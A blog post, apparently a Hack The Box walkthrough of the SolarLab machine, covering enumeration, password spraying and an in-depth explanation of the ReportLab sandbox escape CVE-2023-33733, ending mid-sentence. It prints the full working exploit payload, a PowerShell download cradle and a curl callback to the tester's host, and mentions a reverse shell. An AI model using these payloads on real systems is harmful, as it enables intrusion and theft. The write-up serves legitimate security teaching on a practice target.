        "tags": ["Windows","HTB","Hack The Box","Python","OpenFire","ReportLab","CVE-2023-33733","CVE-2023-32315","Java","JSP","Privilege Escalation","Windows Security","Vulnerability Assessment",],
        "content": "SolarLab Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/SolarLab How I use variables \u0026amp; Wordlists: Variables:\nIn my commands we are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling we this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if we see me using that path that\u0026rsquo;s why. If we are on Kali and following on, we will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\n#Command nmap $box -Pn -oA TCPbasicScan #Results kali in Boxes/BlogEntriesMade/SolarLab/scans/nmap 🍣 main 📝 ×219 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 06:48:30 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 06:48 BST Nmap scan report for 10.129.231.39 Host is up (0.027s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds Initial thoughts: Pretty minimal services running so far SMB, Web \u0026amp; RPC. Comprehensive Scans: In depth scan TCP:\n#Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results kali in Boxes/BlogEntriesMade/SolarLab/scans/nmap 🍣 main 📝 ×219 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 06:48:55 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 06:49 BST Nmap scan report for 10.129.231.39 Host is up (0.029s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http nginx 1.24.0 |_http-title: Did not follow redirect to http://solarlab.htb/ |_http-server-header: nginx/1.24.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 6791/tcp open http nginx 1.24.0 |_http-server-header: nginx/1.24.0 |_http-title: Did not follow redirect to http://report.solarlab.htb:6791/ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 10|2019 (97%) OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-04-13T05:52:10 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 169.05 seconds Findings: This is very interesting as we can see that there is an nginx webserver running on port 6791 and that it redirects to http://report.solarlab.htb:6791/ which means we should update our /etc/hosts file to reflect this so it resolves correctly. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares netexec smb $box -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares As we can see we can authenticate using the guest account and access the Documents \u0026amp; IP$ share. We can also see that null sessions have been disables.\n+Note+: We can see the build number is 19041 We can now enumerate that. Enumerating Users with Impacket-lookupsid: As RPC is running I try and run impacket-lookupsid to dump any usernames however it doesn\u0026rsquo;t seem to work so will need to come back to this.\nimpacket-lookupsid guest@$box -domain-sids -no-pass +Note+: As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password I also try and use netexec but no dice. Using smbclient: We can connect to the share using smbclient\nsmbclient -U \u0026#39;guest\u0026#39; \u0026#34;\\\\\\\\$box\\\\[Share]\u0026#34; We can see there are some interesting files here already. To expedite this process I am going to download the entire smb share with. To do this with smbclient all we have to do is enter the following commands\nEasy way to download all contents of a share using smbclient: Connect to the client as normal:\nRun the following commands from within the SMB shell.\nRECURSE ON PROMPT OFF mget * Discovering Clear Text Passwords in details-file.xlsx from SMB Share: Looking through the files in the smb share. I find a whole spreadsheet of clear text passwords called details-file.xlsx I add these to my email, username \u0026amp; password lists.\n+Important+: I also add the security question answers to the password lists, as these could also be used as passwords. I add just the first name and last name to the users list too, e.g \u0026ldquo;alexander.knight@gmail.com \u0026rdquo; also gets the following entries: alexander knight alexander.knight Additional SMB Findings: I find the email skillspool@woodgroup.com in the training request form and add to the email list. Finding Valid Creds By Password Spraying: Now that we have the passwords and usersnames we can cred stuff using netexec\nnetexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+] We get a hit for blake and one of the found passwords\nBut what are all the guest responses for invalid user password combinations bloodstiller? Fantastic question and here is why (according to the netexec) wiki.\nUsing a random username and password we can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server we\u0026rsquo;re targetting is enabled.\nhttps://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon Basically, we could put in any random username and text and if we got the Guest response it would tell us the guest account is enabled.\nAccessing the Host As Blake: First lets store our username \u0026amp; creds in variables to make things a little easier.\nuser=\u0026#39;blake\u0026#39; pass=\u0026#39;ThisCanB3typedeasily1@\u0026#39; I re-access the Share to see if I can get any further access this way but I cannot.\nWeb 80: Web Enumeration via Burp Suite: When enumerating a Website, always use Burp Suite. This allows we to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track wer testing progress. Running WhatWeb: Against the Base Url/IP: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information:\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output kali in Walkthroughs/HTB/Boxes/BlogEntriesMade/SolarLab 🍣 main 📝 ×219 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 18s 🕙 07:56:07 zsh ❯ whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; http://10.129.231.39 [301 Moved Permanently] Country[RESERVED][ZZ] HTTPServer[nginx/1.24.0] IP[10.129.231.39] RedirectLocation[http://solarlab.htb/] Title[301 Moved Permanently] nginx[1.24.0] http://solarlab.htb/ [200 OK] Bootstrap Country[RESERVED][ZZ] HTML5 HTTPServer[nginx/1.24.0] IP[10.129.231.39] JQuery[2.1.0] Meta-Author[Jewel Theme] Modernizr[2.8.0.min] Script[text/javascript] Title[SolarLab Instant Messenger] X-UA-Compatible[IE=edge] nginx[1.24.0] Results: Appears the site is for an Instant Messenger app. Running jquery 2.1.0 nginx 1.24.0 +Note+: I use sed to put the output across multiple lines for a nicer output. Against report.solarlab.htb:6791: #Command whatweb http://report.solarlab.htb:6791 | sed \u0026#39;s/, /\\n/g\u0026#39; #Results kali in Walkthroughs/HTB/Boxes/BlogEntriesMade/SolarLab 🍣 main 📝 ×219 3GiB/7GiB | 12kiB/1GiB with /usr/bin/zsh 🕙 08:01:36 zsh ❯ whatweb http://report.solarlab.htb:6791 | sed \u0026#39;s/, /\\n/g\u0026#39; http://report.solarlab.htb:6791 [200 OK] Country[RESERVED][ZZ] HTML5 HTTPServer[nginx/1.24.0] IP[10.129.231.39] PasswordField[password] Title[Login - ReportHub] nginx[1.24.0] Results: As we can see there is a password field and this a Login page Running: reporthub Visiting the web page solarlab.htb: Looking at the page it\u0026rsquo;s a single page website with some injection points:\nPotential Injection point 1:\nI try and run a simple injection while proxying through burpsuite but do not get anything. Potential Injection point 2:\nI try and run a simple injection while proxying through burpsuite but do not get anything. We can also see it\u0026rsquo;s the running kite when I click it it directs me to a 404, but I can see on the page the name is for jeweltheme which is also mentioned and they do wordpress themes. I check if it\u0026rsquo;s running wordpress using wpscan which say\u0026rsquo;s it\u0026rsquo;s not.\nI check the repo for the jeweltheme and there is no additional information other than letting us know it\u0026rsquo;s a coming soon page.\nhttps://github.com/jeweltheme/kite-coming-soon-template?tab=readme-ov-file Visiting the web page report.solarlab.htb:6791/login: Visiting the page we can see it\u0026rsquo;s a login page, as expected, for ReportHub.\nLooking online it appears ReportHub is risk management software.\nDirbusting The Webserver Running Using ferox: On base web page: I Perform some directory busting to see if there are any interesting directories:\nFirst against the base webserver running 80\n#Command feroxbuster -u http://$box:80 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt There is nothing of note. Some notes on my flags: --threads 20 --scan-limit 2 I limit the threads \u0026amp; scan limit as otherwise it effectively DDOS\u0026rsquo; the site. -q As I run tmux for most sessions, this quiet flag removes the progress bar and is advised when using tmux etc. -r Follows redirects. - -o $domain-FeroxScan.txt sometimes there can be ALOT of output so this makes it more manageable to go through later. On http://report.solarlab.htb:6791/ #Command feroxbuster -u http://report.solarlab.htb:6791 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt Nothing of note, I actually re-run using ffuf and get a few standard endpoints:\nffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://report.$domain:6791/FUZZ -fc 403 -ic Web 6791 Enumerating Users As Blake: I have been stuck for a little while on this, initially I tried to enumerate users as blake using the standard way like the below however this did not work.\nkali in HTB/Boxes/BlogEntriesMade/SolarLab/scans 🍣 main 📝 ×219 4GiB/7GiB | 2MiB/1GiB with /usr/bin/zsh 🕙 09:15:52 zsh ❯ netexec smb $box -u $user -p $pass --users SMB 10.129.231.39 445 SOLARLAB [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False) SMB 10.129.231.39 445 SOLARLAB [+] solarlab\\blake:ThisCanB3typedeasily1@ SMB 10.129.231.39 445 SOLARLAB [-] Account not found in the BloodHound database. However we can also bruteforce the RID\u0026rsquo;s using netexec/crackmap\u0026rsquo;s built in --rid-brute module and I found another users, openfire, I add this to my list of users.\nnetexec smb $box -u $user -p $pass --rid-brute Discovering the openfire user is locked out: I try some cred stuffing with the \u0026ldquo;openfire\u0026rdquo; user but discover they are locked out.\nUpdating Our User\u0026rsquo;s List: So I got stumped here for a while and started looking at everything again. I fuzzed for subdomains, looked for default creds for the \u0026ldquo;ReportHub\u0026rdquo; software, analyzed static code on the website and after a while I noticed all the users on the main page have what appears to have normal names apart from \u0026ldquo;blake\u0026rdquo; his is listed as \u0026ldquo;Blake Byte\u0026rdquo;, it\u0026rsquo;s a cool last name but I doubt a real one.\nLooking at the details-file.xlsx file again, we can see the answer Blake\u0026rsquo;s security question \u0026ldquo;What is wer mother\u0026rsquo;s maiden name?\u0026rdquo; is \u0026ldquo;Helena\u0026rdquo;\nI add the following entries to my username list, however these also give me no hits.\nblake.helena helena Looking at the other users names we can see that they following the convention(s) of\nlastnamefirstinitial:firstname e.g. \u0026ldquo;KAlexander\u0026rdquo; firstname:firstinitialoflastname e.g \u0026ldquo;AlexanderK\u0026rdquo; \u0026amp; \u0026ldquo;ClaudiaS\u0026rdquo; I add the following entries to my username list, ensuring to cover Blake\u0026rsquo;s listed name as well as mothers maiden name.\nBByte HByte BlakeH BlakeB Information Disclosure Vulnerability: I run my attack in burpsuite again and this time I get a different error, for the username \u0026ldquo;BlakeB\u0026rdquo; I get the response \u0026ldquo;User authentication error\u0026rdquo;\n\u0026ldquo;But bloodstiller why is that important?\u0026rdquo; great question. If we look at another response from this attack we can see two things, first it\u0026rsquo;s a different size (this is due to the response message) and also the error message is \u0026ldquo;User not found.\u0026rdquo;\n\u0026ldquo;But what does that tell us?\u0026rdquo;\nWhen we receive \u0026ldquo;User authentication error\u0026rdquo; for the username \u0026ldquo;BlakeB\u0026rdquo;, it confirms this username exists in the system but our password attempt was incorrect. In contrast, when we receive \u0026ldquo;User not found\u0026rdquo; for other usernames, the system is telling us these accounts don\u0026rsquo;t exist at all.\nThis is actually classed as an \u0026ldquo;information disclosure vulnerability\u0026rdquo; as it allows us to enumerate valid usernames based on the different responses which we can then focus on password attacks for. This is exactly why security best practices recommend using generic error messages like \u0026ldquo;Invalid username or password\u0026rdquo; that don\u0026rsquo;t reveal whether the username exists or the password is incorrect.\n2. Foothold: Finding blakes login password for reporthub after making a mistake: So after some more fuzzing and password spraying I had realized, I had the Payload Encoding option turned on in burpsuite.\nAfter turning this off, it turned out I had blakeb\u0026rsquo;s password all along.\nblakeb:ThisCanB3typedeasily1@ Logging into ReportHub as Blake: Logging into ReportHub we are given 4 different options:\nClicking into each option provides what appears to be the same page.\nWe can enter dates, contact number, a message \u0026amp; then the ability to upload a signature \u0026amp; then generate a pdf.\nThe first thing that strikes me is that the justification box has the ability to enter code, this coupled with the fact that the contents of the justification box has to be processed when generating a PDF leads me to believe we could potentially get code execution this way.\nTrying to get RCE in ReportHub: I create a code box in the pdf generator and enter the below. I also start a python web server.\npowershell -Command \u0026#34;(new-object net.webclient).DownloadString(\u0026#39;http://10.10.14.20:9000/test\u0026#39;)\u0026#34; When I click to generate the pdf it forces me to upload a signature, I upload a cat picture and generate it and are provided the below.\nDiscovering ReportLab is being used: Running exiftool on the downloaded pdf shows us that it\u0026rsquo;s using the ReportLab PDF library\nexiftool output.pdf Some quick searching online reveals some CVE\u0026rsquo;s namely CVE-2023-33733 CVE-2023-33733 Breakdown: Buckle up as we are going into great detail as to why this exploit works and the mechanisms around it, I would urge you to read the below links as well to really understand what is happening under the hood here as it will greatly increase your understanding. However if you just want to skip to the end and run the exploit by all means do, but if you do not understand why this works you are doing yourself a disservice.\nSome recommended reading:\nhttps://socradar.io/cve-2023-33733-vulnerability-in-reportlab-allows-bypassing-sandbox-restrictions/ https://github.com/c53elyas/CVE-2023-33733 This took me a long while to understand this so I a have tried to explain it as simply as I can below for others to understand.\n+Important+:\nI also want to be VERY clear, I am just explaining the great work done by c53elyas I lay no claim to it myself, this is just a means to understand the work. If there is anything wrong please do send me an email to correct me bloodstiller@bloodstiller.com The Vulnerability: Unsafe \u0026ldquo;eval\u0026rdquo; eval Primer: First of all, what is eval() and what does it do?\neval() takes text and runs it as Python code.\nHere is a simple Example:\neval(\u0026#34;2 + 2\u0026#34;) # Runs this as code, gives 4 eval(\u0026#34;print (\u0026#39;hello world\u0026#39;)\u0026#34;) # Run this and it will print hello world Bad guys love eval() because it allows the running of os level commands like the below by using the os module\neval(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;calc.exe\u0026#39;)\u0026#34;) # This will open Calculator on Windows! eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;/usr/bin/firefox -browser http://google.com\u0026#39;)\u0026#34;) #This will open firefox and open google.com eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;/bin/nc http://[maliciousHost]:[Port]\u0026#39;)\u0026#34;) #This could be used to launch nc and connect back to a malcious endpoint The issue:\nWhat did Report-Lab do wrong?? (nothing, they did their best and attackers are sneaky however here is a wide overview) They let people give input (this is fine as people need to use the software) That input got passed to eval() without sanitization \u0026amp; this led to RCE CVE-2019-17626 The solution: They tried to make it safe with \u0026ldquo;safe eval\u0026rdquo; (rl_safe_eval) by creating sandbox when they patched it.\nThis sandbox blocked dangerous functionality like: open, exec, eval, etc. It also blocked secret attributes like __globals__, ___class___, __code__. They made a safer version of getattr() and type(). But the problem is: Python is tricky. Even with some protections, smart attackers can still \u0026ldquo;sneak\u0026rdquo; dangerous stuff back!\nThe Exploit Idea: Escape the created sandbox: The goal:\nGet back the original Python tools that can run system commands e.g. eval, exec, open Step by step High Level:\nSneak around the sandbox restrictions. Find the hidden way to access dangerous stuff like os.system. Run any command Step 1: Get back the real type() function What is type I hear you ask? In Python, type() is an inbuilt function that does two things.\nIt enables us to query what class an object is, this is done by passing it a single argument like below.\n\u0026gt;\u0026gt;\u0026gt; type(1) \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type(\u0026#34;s\u0026#34;) \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type(1.4) \u0026lt;class \u0026#39;float\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type(eval) \u0026lt;class \u0026#39;builtin_function_or_method\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type(False) \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; type(True) \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; It enables us to create objects/classes dynamically on the fly by passing it 3 arguments.\n# Define a simple method for our class def say_hello(self, name): return f\u0026#34;Hello, {name}!\u0026#34; # Create a class using type() SimpleGreeter = type( \u0026#34;SimpleGreeter\u0026#34;, # Class name (object,), # Base classes (tuple) { # Class attributes and methods dictionary \u0026#34;greeting\u0026#34;: \u0026#34;Hello\u0026#34;, \u0026#34;say_hello\u0026#34;: say_hello } ) # Use the dynamically created class if __name__ == \u0026#34;__main__\u0026#34;: # Create an instance greeter = SimpleGreeter() # Access the class attribute print(f\u0026#34;Default greeting: {greeter.greeting}\u0026#34;) # Call the method message = greeter.say_hello(\u0026#34;Alice\u0026#34;) print(message) # Output: Hello, Alice! # Verify it\u0026#39;s the class we created print(f\u0026#34;Class name: {greeter.__class__.__name__}\u0026#34;) If you want you can just paste the above as a code block into a python shell to watch it execute.\nSo why am I explaining this all, well if we can access type() and pass it 3 arguments we can create classes on the fly to access functionality we should not be able to access in the restricted environment.\nEscaping Sand-boxed type() function: In the sandbox, a fake type() class (below) is used,to prevent us being able to use the original in-built version of type().\ndef __rl_type__(self, *args): if len(args) == 1: return type(*args) raise BadCode(\u0026#39;type call error\u0026#39;) In this restricted version of type only one argument can be passed, and if more than one argument is passed it will return BadCode 'type call error' which means it cannot from doing something like:\ngetattr(func, \u0026#39;__globals__\u0026#39;) # gives access to the global scope So we need a way to trick this check.\nSide Quest: What does func.__globals__ do \u0026amp; why is it dangerous? In Python, functions have an attribute called __globals__ that points to the global namespace (i.e., the dictionary of all variables available when the function was defined).\ndef my_func(): return 42 print(my_func.__globals__) This prints a dictionary — like:\n{ \u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;os\u0026#39;: \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;...\u0026#39;\u0026gt;, \u0026#39;open\u0026#39;: \u0026lt;built-in function open\u0026gt;, \u0026#39;eval\u0026#39;: \u0026lt;built-in function eval\u0026gt;, ... } That means, from any function, you can access everything in the global scope, including modules like os, and dangerous built-ins like eval, open, exec, etc.\nWhy is that dangerous?\nLet\u0026rsquo;s say we\u0026rsquo;re inside a sandboxed eval() environment where built-ins like open, os.system, etc., are removed.\nBut if you can do:\ngetattr(safe_function, \u0026#39;__globals__\u0026#39;) …you can break out of that sandbox, because now you have:\nglbs = getattr(safe_function, \u0026#39;__globals__\u0026#39;) # Windows glbs[\u0026#39;os\u0026#39;].system(\u0026#39;calc.exe\u0026#39;) # on Windows # Nix glbs[\u0026#39;eval\u0026#39;](\u0026#39;open(\u0026#34;secret.txt\u0026#34;).read()\u0026#39;) Why the sandbox blocks it:\nThe sandbox tries to prevent this by blocking any attribute access like __globals__ or __code__, because:\n__globals__ → gives access to all variables and modules. __code__ → lets you inspect or even modify function internals. __class__ → can give access to dangerous metaprogramming tools. If we bypass those restrictions using the fake Word class (see below), we can call:\ngetattr(pow, Word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;calc.exe\u0026#39;) Even though \u0026lsquo;__globals__\u0026rsquo; is blocked in the sandbox, it gets sneaked in using a fake object that tricks the checks.\nThe Trick: A Fake String Class: In Python, we can subclass built-in types like str and override their methods. That includes startswith(), __eq__, and __hash__.\nWe can use this power to create a custom string-like object that lies about itself in order to pass the sandbox checks.\nHow the Sandbox Works: So we can understand the exploit we let’s look at this method that checks names in the safe eval system.\ndef __rl_is_allowed_name__(self, name): if name in __rl_unsafe__ or (name.startswith(\u0026#39;__\u0026#39;) and name != \u0026#39;__\u0026#39;): raise BadCode(\u0026#34;Unsafe access of %s\u0026#34; % name) This function does two things: Checks if the name is in a list of known unsafe names (__rl_unsafe__).\nChecks if the name starts with double underscores (__) but isn’t just \u0026lsquo;__\u0026rsquo;.\nThe key here is that both of these checks rely on the string’s methods — and we can override them.\nCreating The Custom String Class: Here’s the class the we can build, using the recovered type() to trick the sandbox:\n# Recover true type to enable us to create a class orgTypeFun = type(type(1)) # Call recovered type to create a class Word = orgTypeFun(\u0026#39;Word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: False, \u0026#39;__eq__\u0026#39;: lambda self, x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)), }) Let’s break this down: Create the new class: Word = orgTypeFun(\u0026#39;Word\u0026#39;, (str,), { ... }) This is creating a new class called Word, that inherits from str, using the recovered original type() function.\nThe str inheritance means the object behaves mostly like a normal string, but we’re overriding key behaviors.\nWhat’s Overridden and Why: We are going to leave this int here at the moment as it will come into play a bit later on and make more sense, however just know that we create an object called mutated which has the int value of 1\n\u0026#39;mutated\u0026#39;: 1, startswith: Bypassing the __ check We want to bypass the (name.startswith('__') check that happens in the sandbox, we do this with the following lines.\n\u0026#39;startswith\u0026#39;: lambda self, x: False, This line is defining a method named startswith for a class, and it\u0026rsquo;s using a lambda function that always returns False regardless of the input.\nBreaking it down:\n\u0026lsquo;startswith\u0026rsquo; is the name of the method being defined lambda self, x: False is a function that takes two parameters (self and x) but ignores them completely and always returns False\nThis means that for any instance of this class, when you call the startswith() method with any argument, it will always return False.\nMeaning we can call \u0026ldquo;__globals__\u0026rdquo;, and this method returns False resulting in it bypassing the sandbox check\n__eq__: Tricking exact string comparison: The sandbox also checks the following:\nif name in __rl_unsafe__: To pass this check, the string should not match known bad strings like \u0026lsquo;__globals__\u0026rsquo;.\nPython does this check by calling __eq__ for comparisons but remember we are using a custom subclass of str, so with the below we are overriding the built in functionality of __eq__.\nSo, we override __eq__ with the following code.\n\u0026#39;mutated\u0026#39;:1, \u0026#39;__eq__\u0026#39; : lambda self, x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39; : lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1) We need to know what mutate does before this will make sense so let me explain that:\n\u0026#39;mutate\u0026#39; : lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1) It decrements the mutated attribute by 1 using setattr, remember at the start of this I showed how we created an object called mutated with a value of 1? Well in simple terms it takes the mutated value which we set as 1 at the start and deducts 1, this may sound weird but will make more sense soon. Back to the __eq__ method:\nThe __eq__ method does three things, in order:\nself.mutate()\n→ Calls the muteate method that subtracts 1 from mutated via self.mutated. So self.mutated becomes 0, then on the next cycle it becomes -1, and so on. self.mutated \u0026lt; 0\n→ It then checks if self.mutated is greater than 0. Which will return False the first time (when mutated == 0), but True later (when mutated \u0026lt; 0). str(self) == x\n→ Only checked if the previous two conditions pass. So when the sandbox checks:\nif name == \u0026#39;__globals__\u0026#39;: First time it runs, when the sandbox checks if it\u0026rsquo;s dangerous: self.mutated = 1 self.mutate() makes it 0 self.mutated \u0026lt; 0 is False ✔ So the whole thing is False which lets us bypass the check so __if name == '__globals__' returns False\nNext time it runs for getattr() self.mutated = 0 self.mutate() makes it -1 self.mutated \u0026lt; 0 is now True If the actual string is \u0026ldquo;__globals__\u0026rdquo;, then str(self) == x is also True ✔ Now __eq__ returns True\n✔ So we can access __globals__ successfully\nSo the object acts safe at first by returning False, then dangerous when needed by returning True.\n__hash__: Required for dictionary lookups The sandbox might put strings into sets or dicts, so the object needs to be hashable.\nThis returns the hash of the real string, that\u0026rsquo;s all.\n\u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) It ensures it can be used in any place that expects a regular string.\nResult of the above: When this fake Word('___globals___') object is passed to getattr, it:\nBypasses startswith('__') check as this always returns False. Avoids matching bad strings at the right time returns False again Acts like a real string when the actual Python interpreter uses it, returns True when needed. Step 3: Access the globals: In Python, every function remembers where it came from using __globals__, (remember I said this above.) Well inside the sandbox, \u0026ldquo;safe\u0026rdquo; functions like pow() still remember their __globals__ which means we can use our Word class (which has all the sneaky bypasses) to access these __globals__ and in turn call these functions that are inherently part of them.\nWe use our Word class to ask:\nglobalsattr = Word(\u0026#39;__globals__\u0026#39;) glbs = getattr(pow, globalsattr) Now we have the sandbox’s globals! We can do the following.\nglbs[\u0026#39;os\u0026#39;].system(\u0026#39;calc.exe\u0026#39;) # 🎉 Calculator opens! Step 4: Put it all in one line: So now we have all the relevant parts of the bypass made. However, the sandbox only allows single-line expressions, so we can’t write normal multi-line Python code.\nTo get around this, we use a list comprehension, which lets us run multiple things inside a single line.\nOne odd thing to note: with list comprehensions like:\n[print(x) for x in [\u0026#39;Hello\u0026#39;]] Python reads the innermost part first, and then moves outward — so it can feel like you’re reading from the bottom up.\nSo, the full attack looks like:\n[ [ # Run the command using system() getattr(pow, Word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;[maliciousCommandHere]\u0026#39;) # Create the fake \u0026#34;Word\u0026#34; class to trick the sandbox for Word in [ orgTypeFun( \u0026#39;Word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: False, \u0026#39;__eq__\u0026#39;: lambda self, x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) } ) ] ] # Recover the real type() function for orgTypeFun in [type(type(1))] ] Summary (Super Simple)\nStep What We Did Why 1 Recover original type() Get real Python powers back 2 Build fake class Word Trick sandbox’s safety checks 3 Get to globals() Find dangerous functions like os.system() 4 One-liner trick Run everything at once, bypassing line limit Step 5: Wrap it in html tags: For this to work we need to wrap the payload in html tags like below. This is because there a specific library is called when processing html which will in turn process our payload. Looking at the write up we can see the below:\nA lot of apps and libraries use the Reportlab library for example xhtml2pdf utility function is vulnerable and can suffer from code execution while transforming malicious HTML to pdf\nI have modified the initial payload to be a ping command as this should be accessible by most OS\u0026rsquo;s and enable us to prove RCE.\n\u0026lt;para\u0026gt; \u0026lt;font color=\u0026#34;[ [ getattr(pow,Word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;ping 10.10.14.20\u0026#39;) for Word in [orgTypeFun(\u0026#39;Word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: False, \u0026#39;__eq__\u0026#39;: lambda self,x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt; exploit \u0026lt;/font\u0026gt; \u0026lt;/para\u0026gt; We need to start a listener using tcpdump to listen out for the ICMP requests that we get\nsudo tcpdump -i tun0 icmp Getting RCE On The Target: Finding our injection point for RCE: Now we have a payload and a listener setup we need to actually find somewhere to inject this on the web-app. To save you all heartache, here are the things I tried before finding a valid injection point:\nWhat didn\u0026rsquo;t work: Put code in \u0026ldquo;Justification box\u0026rdquo;\nIn code box (too long as 300 char limit) so intercepted in burp and then pasted full payload in-case we could bypass via this method. Out of code box (raw text) same as above. In code box then intercepted in burp and removed the tags same as above. In a logo file as html:\nIntercepted in burp and changed the mime/type to bypass validation. Created a png with a double extension and intercepted. Getting Our RCE POC To Work! We can use the \u0026ldquo;Leave Request\u0026rdquo; template and enter all of the below placeholder information. We then set burp to intercept and press \u0026ldquo;Generate PDF\u0026rdquo; to create the POST request we can then grab the request and send it to Repeater.\nIn repeater we can paste the payload into the leave_request parameter, remember everything get\u0026rsquo;s processed by the library when generating the PDF!\nBoom we have pings coming back to our host machine so we know this host is vulnerable and we have RCE!\nTesting If We Can Use Curl: We can modify the payload to the below and setup a simple nc listener to see if we can get a call-back to ourselves.\nCreate listener\nnc -nvlp 8888 Modify the payload to be a curl request:\ncurl http://10.10.14.20:8888/testnc We get a connection so we can curl down a script for it to be executed if want.\nGetting A Reverse Shell: I was going to use a download cradle to download and execute this, however I opted for We are going to use a super simple base64 encoded powershell reverse shell available from revshells.com\nStart out listener:\nnc -nvlp 8888 Modify the payload, by again capturing a POST request and sending it to Repeater.\nShell caught:\nLets grab our User.txt\nDiscover user.db file: After some enumeration I find a database called users.db in the directory \u0026ldquo;C:\\Users\\blake\\Documents\\app\\instance\\\u0026rdquo;\nAs we are working with a limited shell at the moment….and I haven\u0026rsquo;t gotten around to upgrading it just yet we will use a simple base64 transfer method to transfer the db to ourselves.\nFirst we convert the users.db object to base64 and store it in the variable 